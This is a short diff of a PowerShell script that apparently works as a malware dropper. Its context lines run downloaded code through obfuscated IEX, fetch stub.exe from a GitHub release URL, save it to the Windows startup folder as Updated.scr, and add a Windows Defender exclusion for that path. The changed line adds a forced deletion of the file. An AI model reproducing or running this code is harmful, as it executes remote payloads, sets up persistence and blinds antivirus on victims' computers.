@@ -54,7 +54,7 @@ Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updated.scr"
 Add-MpPreference -ExclusionPath $output
-
+Remove-Item -Path "$output" -Force
 if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
